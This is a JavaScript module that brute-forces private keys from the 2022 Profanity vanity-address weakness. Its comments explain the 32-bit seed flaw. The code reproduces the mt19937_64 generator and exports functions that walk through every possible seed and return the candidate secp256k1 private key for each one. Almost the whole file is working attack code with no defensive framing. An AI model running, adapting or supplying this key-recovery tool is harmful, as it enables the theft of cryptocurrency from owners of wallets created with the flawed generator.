// Profanity vanity address generator vulnerability (September 2022)
// The tool seeded mt19937_64 with only a 32-bit value from std::random_device,
// collapsing the effective keyspace from 2^256 to 2^32.
// Disclosed by 1inch; exploited in the Wintermute hack ($160M lost).
// We iterate all 2^32 seeds, derive each private key, and check.

const N = 312, M = 156;
const MATRIX_A = 0xB5026F5AA96619E9n;
const MASK64   = 0xFFFFFFFFFFFFFFFFn;
const UM       = 0xFFFFFFFF80000000n;
const LM       = 0x7FFFFFFFn;
const INIT_MUL = 6364136223846793005n;

function mt64Key(seed32) {
  // Init mt19937_64 with 32-bit seed (same as C++ std::mt19937_64)
  const mt = new Array(N);
  mt[0] = BigInt(seed32 >>> 0);
  for (let i = 1; i < N; i++) {
    mt[i] = (INIT_MUL * (mt[i - 1] ^ (mt[i - 1] >> 62n)) + BigInt(i)) & MASK64;
  }

  // Twist
  const mag01 = [0n, MATRIX_A];
  let kk, x;
  for (kk = 0; kk < N - M; kk++) {
    x = (mt[kk] & UM) | (mt[kk + 1] & LM);
    mt[kk] = mt[kk + M] ^ (x >> 1n) ^ mag01[Number(x & 1n)];
  }
  for (; kk < N - 1; kk++) {
    x = (mt[kk] & UM) | (mt[kk + 1] & LM);
    mt[kk] = mt[kk + (M - N)] ^ (x >> 1n) ^ mag01[Number(x & 1n)];
  }
  x = (mt[N - 1] & UM) | (mt[0] & LM);
  mt[N - 1] = mt[M - 1] ^ (x >> 1n) ^ mag01[Number(x & 1n)];

  // Extract 4 × uint64 → 32-byte private key (big-endian, matching secp256k1 convention)
  const key = new Uint8Array(32);
  for (let i = 0; i < 4; i++) {
    let y = mt[i];
    y ^= (y >> 29n) & 0x5555555555555555n;
    y ^= (y << 17n) & 0x71D67FFFEDA60000n;
    y ^= (y << 37n) & 0xFFF7EEE000000000n;
    y ^= (y >> 43n);
    y &= MASK64;
    for (let b = 7; b >= 0; b--) {
      key[i * 8 + b] = Number(y & 0xFFn);
      y >>= 8n;
    }
  }
  return key;
}

let _seed = 0;

export function resetProfanity(startSeed = 0) { _seed = startSeed >>> 0; }
export function getProfanitySeed() { return _seed; }
export function profanityTotal() { return 0x100000000; }

export function nextProfanityKey() {
  if (_seed >= 0x100000000) return { key: null, seed: _seed, exhausted: true };
  const seed = _seed++;
  return { key: mt64Key(seed), seed, exhausted: false };
}
